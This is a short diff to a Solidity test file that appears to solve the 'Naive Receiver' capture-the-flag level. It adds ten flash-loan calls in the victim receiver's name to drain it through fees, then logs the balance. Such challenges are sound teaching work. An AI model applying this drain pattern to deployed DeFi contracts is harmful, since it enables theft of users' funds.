@@ -52,6 +52,19 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT END *
          */
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+
+        console.log(address(flashLoanReceiver).balance);
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
